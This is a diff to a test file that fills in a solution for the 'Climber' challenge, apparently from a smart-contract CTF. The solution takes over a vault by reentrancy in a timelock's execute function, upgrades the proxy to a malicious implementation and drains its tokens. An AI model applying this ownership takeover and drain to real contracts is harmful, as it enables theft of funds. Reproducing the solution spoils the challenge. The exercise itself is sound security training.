@@ -56,8 +56,24 @@ describe('[Challenge] Climber', function () {
         await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
     });
 
+    // Exploit - using reentrancy inside ClimberTimelock.execute
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        let hack = await (await ethers.getContractFactory('HackClimber', player)).deploy();
+        await hack.connect(player).becomeOwner(vault.address, timelock.address);
+
+        // at this point `attacker` is the owner of the ClimberVault and he can do what ever he wants
+        // For example we could upgrade to a new implementation that allow us to do whatever we want
+
+        // Deploy the new implementation
+        let newVaultImpl = await (await ethers.getContractFactory('PawnedClimberVault', player)).deploy();
+        // Upgrade the proxy implementation to the new vault
+        await vault.connect(player).upgradeTo(newVaultImpl.address);
+
+        // withdraw all the funds
+        let newVault = await (
+            await ethers.getContractFactory('PawnedClimberVault', player)
+        ).attach(vault.address);
+        await newVault.connect(player).withdrawAll(token.address);
     });
 
     after(async function () {
